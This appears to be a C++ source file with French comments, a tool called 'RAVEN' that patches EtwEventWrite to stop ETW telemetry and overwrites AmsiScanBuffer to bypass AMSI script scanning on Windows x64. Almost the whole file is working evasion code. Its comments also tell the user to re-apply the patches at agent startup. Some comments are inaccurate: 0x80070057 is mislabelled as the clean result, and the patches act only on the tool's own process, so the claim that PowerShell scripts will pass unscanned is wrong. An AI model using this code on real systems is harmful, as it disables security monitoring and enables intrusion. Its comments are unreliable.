// language: C++17, file: etw_amsi_patch.cpp, target: Windows x64 (lab VM)
// LES DEUX COUPS D'ÉPÉE :
//   1. patching ETW  — EtwEventWrite reçoit un "ret" immédiat : la télémétrie s'arrête
//   2. bypass AMSI   — AmsiScanBuffer reçoit un "RESULT_CLEAN" : les scripts passent
// Le EDR qui regarde ETW ne voit plus rien. Les scripts PowerShell ne sont plus scannés.
#include <windows.h>
#include <psapi.h>
#include <cstdio>

static BYTE* FindInMod(const char* modName, const char* func) {
    HMODULE mod = GetModuleHandleA(modName);
    if (!mod) mod = LoadLibraryA(modName);
    if (!mod) return NULL;
    BYTE* base = (BYTE*)mod;
    auto dos = (PIMAGE_DOS_HEADER)base;
    auto nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    auto expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    auto exp = (PIMAGE_EXPORT_DIRECTORY)(base + expDir.VirtualAddress);
    auto names = (DWORD*)(base + exp->AddressOfNames);
    auto ords  = (WORD*)(base + exp->AddressOfNameOrdinals);
    auto funcs = (DWORD*)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* n = (char*)(base + names[i]);
        if (!_stricmp(n, func)) return base + funcs[ords[i]];
    }
    return NULL;
}

static void Patch(void* addr, const BYTE* patch, SIZE_T len, const char* label) {
    DWORD oldProt;
    VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &oldProt);
    memcpy(addr, patch, len);
    VirtualProtect(addr, len, PAGE_EXECUTE, &oldProt);
    printf("[OK] %s patché (%llu octets)\n", label, (unsigned long long)len);
}

int main() {
    printf("[*] RAVEN — ETW patch + AMSI bypass\n\n");

    // 1. ETW : EtwEventWrite <- ret (0xC3)
    BYTE* etw = FindInMod("ntdll.dll", "EtwEventWrite");
    if (etw) {
        BYTE ret[] = { 0xC3 };
        Patch(etw, ret, 1, "EtwEventWrite (télémétrie coupée)");
    } else printf("[X] EtwEventWrite introuvable\n");

    // 2. AMSI : AmsiScanBuffer <- mov eax, AMSI_RESULT_CLEAN (0x80070057) ; ret
    BYTE* amsi = FindInMod("amsi.dll", "AmsiScanBuffer");
    if (amsi) {
        BYTE clean[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };  // mov eax, 0x80070057 ; ret
        Patch(amsi, clean, 6, "AmsiScanBuffer (résultat: CLEAN forcé)");
    } else printf("[!] amsi.dll pas chargée (normal hors PowerShell — le patch s'appliquera au chargement)\n");

    printf("\n[*] vérifie dans PowerShell : les scripts passent sans alerte\n");
    printf("[*] vérifie avec un EDR : plus AUCUN événement ETW n'est émis par ce process\n");
    printf("[*] ces patches ne survivent pas au reboot — les relancer au démarrage de l'agent\n");
    return 0;
}
